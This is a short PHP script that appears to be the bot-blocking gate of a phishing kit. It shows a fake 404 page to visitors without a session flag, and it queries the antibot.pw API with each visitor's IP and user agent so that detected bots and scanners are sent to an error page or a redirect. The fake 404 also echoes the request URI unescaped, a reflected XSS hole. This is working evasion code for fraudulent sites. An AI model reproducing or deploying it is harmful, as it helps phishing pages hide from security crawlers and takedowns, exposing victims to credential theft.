<?php

if (!isset($_SESSION['redi_watch'])) {
header("HTTP/1.0 404 Not Found");
exit("<h1>Not Found</h1>
The requested URL " . $_SERVER["REQUEST_URI"] . " was not found on this server.
<hr>");
}


$ip = 
  isset($_SERVER["HTTP_CF_CONNECTING_IP"])?
     $_SERVER["HTTP_CF_CONNECTING_IP"]:
     $_SERVER["REMOTE_ADDR"]
  ;
 
$agent = (urlencode($_SERVER["HTTP_USER_AGENT"]));

$getdata = file_get_contents("https://antibot.pw/api/v2-blockers?ip=".$ip."&apikey=".$antibotpw_api."&ua=".$agent);

$json_obj = json_decode($getdata); 

if ($json_obj->block_access or $json_obj->is_bot == true){
    	if ($failed_url == true){
	    require($errorpage);
	    exit();
	}else{
	header('Location: ' . $multiple_url);
    exit();
	}
}


?>